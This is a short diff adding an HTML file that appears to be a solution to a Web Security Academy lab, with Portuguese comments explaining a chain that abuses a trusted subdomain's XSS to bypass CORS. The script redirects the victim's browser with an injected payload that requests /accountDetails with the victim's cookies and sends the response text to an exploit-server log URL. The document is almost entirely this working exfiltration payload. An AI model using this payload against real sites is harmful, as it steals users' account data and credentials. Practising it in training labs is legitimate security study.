@@ -1,0 +1,9 @@
+<!-- O document.location redireciona o navegador da vítima para o subdomínio de estoque (stock.algo) em HTTP --> 
+
+<!-- Nesse redirecionamento, o valor do parâmetro productId contém um segundo script, que é o XSS.--> 
+
+<!-- Esse segundo script, executado no subdomínio confiável (stock.algo), instancia um XMLHttpRequest e faz uma requisição ao endpoint /accountDetails com withCredentials definido como verdadeiro, ou seja, incluindo os cookies da vítima. -->  
+
+<script>
+    document.location="http://stock.ID-DO-LAB.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ID-DO-LAB.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ID-DO-EXPLOIT-SERVER.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
